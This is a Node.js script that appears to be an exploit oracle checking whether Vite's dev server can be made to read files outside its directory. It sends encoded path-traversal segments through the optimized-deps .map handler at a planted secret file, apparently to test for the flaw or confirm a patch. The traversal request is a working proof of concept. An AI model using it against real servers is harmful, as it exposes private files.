'use strict';
const fs = require('node:fs');
const path = require('node:path');
const os = require('node:os');

function result(obj) {
  console.log('ORACLE_RESULT ' + JSON.stringify(obj));
}

async function main() {
  let operation_completed = false;
  let exploit_succeeded = false;
  let evidence = '';

  const marker = 'vite_oracle_' + process.pid + '_' + Date.now();
  const root = path.join(os.tmpdir(), marker);
  const depsDir = path.join(root, 'node_modules', '.vite', 'deps');
  const secretDir = path.join(os.tmpdir(), marker + '_secret');
  const secretFile = path.join(secretDir, 'secret.txt');
  const secretContent = 'TOP-SECRET-' + marker;

  let vite;
  let server;

  try {
    fs.mkdirSync(depsDir, { recursive: true });
    fs.mkdirSync(secretDir, { recursive: true });
    fs.writeFileSync(secretFile, secretContent, 'utf8');

    // A benign package.json/index so createServer has something to work with
    fs.writeFileSync(path.join(root, 'package.json'), JSON.stringify({ name: 'oracle-fixture', version: '0.0.0' }), 'utf8');
    fs.writeFileSync(path.join(root, 'index.html'), '<html></html>', 'utf8');

    vite = require('vite');
  } catch (e) {
    result({ operation_completed: false, exploit_succeeded: false, evidence: 'setup failed: ' + (e && e.message) });
    return;
  }

  try {
    server = await vite.createServer({
      root,
      configFile: false,
      logLevel: 'silent',
      server: { middlewareMode: true, hmr: false, watch: null },
      optimizeDeps: { noDiscovery: true, include: [] },
      cacheDir: path.join(root, 'node_modules', '.vite'),
    });
  } catch (e) {
    result({ operation_completed: false, exploit_succeeded: false, evidence: 'createServer failed: ' + (e && e.message) });
    return;
  }

  try {
    // Write a benign chunk + its sourcemap directly in the deps cache dir,
    // to prove the normal optimized-deps `.map` serving path functions.
    const benignName = 'chunk-BENIGN.js';
    const benignMapName = benignName + '.map';
    fs.writeFileSync(path.join(depsDir, benignName), '// benign chunk\n', 'utf8');
    fs.writeFileSync(path.join(depsDir, benignMapName), JSON.stringify({ version: 3, sources: [], mappings: '' }), 'utf8');

    const benignUrl = '/node_modules/.vite/deps/' + encodeURIComponent(benignMapName);
    const benignReq = { url: benignUrl, method: 'GET', headers: { host: 'localhost' }, socket: {} };
    let benignBody = '';
    const benignRes = makeFakeRes((chunk) => { benignBody += chunk; });

    await dispatch(server, benignReq, benignRes);

    const benignOk = benignRes.statusCode && benignRes.statusCode < 400 && benignBody.includes('version');
    if (!benignOk) {
      result({ operation_completed: false, exploit_succeeded: false, evidence: 'benign deps map request failed, status=' + benignRes.statusCode + ' body=' + benignBody.slice(0, 200) });
      await safeClose(server);
      return;
    }

    operation_completed = true;

    // Malicious request: craft a `.map` filename using encoded traversal
    // sequences to escape the deps cache directory and read a secret file
    // located outside the project root entirely (sibling tmp directory).
    const rel = path.relative(depsDir, secretFile).split(path.sep).join('/');
    const maliciousName = rel + '.map';
    const maliciousUrl = '/node_modules/.vite/deps/' + maliciousName.split('/').map(encodeURIComponent).join('/');

    const maliciousReq = { url: maliciousUrl, method: 'GET', headers: { host: 'localhost' }, socket: {} };
    let maliciousBody = '';
    const maliciousRes = makeFakeRes((chunk) => { maliciousBody += chunk; });

    let threw = false;
    let errMsg = '';
    try {
      await dispatch(server, maliciousReq, maliciousRes);
    } catch (e) {
      threw = true;
      errMsg = (e && e.message) || String(e);
    }

    const status = maliciousRes.statusCode;
    const leaked = maliciousBody.includes(secretContent);

    if (leaked) {
      exploit_succeeded = true;
      evidence = 'Path traversal succeeded: secret content leaked via deps .map handler, status=' + status;
    } else if (threw) {
      exploit_succeeded = false;
      evidence = 'Malicious request blocked with exception: ' + errMsg + ' status=' + status;
    } else {
      exploit_succeeded = false;
      evidence = 'Malicious request did not leak secret, status=' + status + ' bodyLen=' + maliciousBody.length;
    }
  } catch (e) {
    if (operation_completed) {
      exploit_succeeded = false;
      evidence = 'Exception during malicious attempt (treated as blocked): ' + (e && e.message);
    } else {
      evidence = 'Unexpected failure before benign op completed: ' + (e && e.message);
    }
  } finally {
    await safeClose(server);
    try { fs.rmSync(root, { recursive: true, force: true }); } catch (_) {}
    try { fs.rmSync(secretDir, { recursive: true, force: true }); } catch (_) {}
  }

  result({ operation_completed, exploit_succeeded, evidence });
}

function makeFakeRes(onWrite) {
  const headers = {};
  const res = {
    statusCode: 200,
    _ended: false,
    setHeader(k, v) { headers[k] = v; },
    getHeader(k) { return headers[k]; },
    removeHeader(k) { delete headers[k]; },
    writeHead(code, _headers) {
      res.statusCode = code;
      if (_headers) Object.assign(headers, _headers);
    },
    write(chunk) {
      if (chunk) onWrite(chunk.toString());
      return true;
    },
    end(chunk) {
      if (chunk) onWrite(chunk.toString());
      res._ended = true;
    },
    on() {},
    once() {},
    emit() {},
    headersSent: false,
  };
  return res;
}

function dispatch(server, req, res) {
  return new Promise((resolve, reject) => {
    let settled = false;
    const finish = () => {
      if (settled) return;
      settled = true;
      resolve();
    };
    const origEnd = res.end;
    res.end = function (chunk) {
      origEnd(chunk);
      finish();
    };
    try {
      server.middlewares.handle(req, res, (err) => {
        if (err) {
          settled = true;
          reject(err);
          return;
        }
        finish();
      });
    } catch (e) {
      if (!settled) {
        settled = true;
        reject(e);
      }
    }
    setTimeout(finish, 3000);
  });
}

async function safeClose(server) {
  if (!server) return;
  try { await server.close(); } catch (_) {}
}

main().catch((e) => {
  result({ operation_completed: false, exploit_succeeded: false, evidence: 'Unhandled top-level error: ' + (e && e.message) });
});
